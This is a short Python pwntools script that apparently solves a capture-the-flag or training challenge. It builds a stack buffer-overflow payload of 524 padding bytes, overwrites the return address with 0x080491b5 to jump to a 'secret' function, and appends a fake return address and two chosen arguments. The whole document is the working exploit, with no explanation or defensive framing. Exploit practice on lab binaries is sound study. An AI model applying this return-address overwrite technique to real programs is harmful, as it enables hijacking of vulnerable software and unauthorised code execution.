from pwn import *
import sys

buffer = b"A"*524 # 512 bytes for name, 4 bytes for EBX, 4 bytes for padding, and 4 bytes for EBP
secret_address = p32(0x080491b5)
secret_return_address = b"A"*4
arg1 = p32(0xDEADBEEF)
arg2 = p32(0xCAFEF00D)
sys.stdout.buffer.write(buffer+secret_address+secret_return_address+arg1+arg2)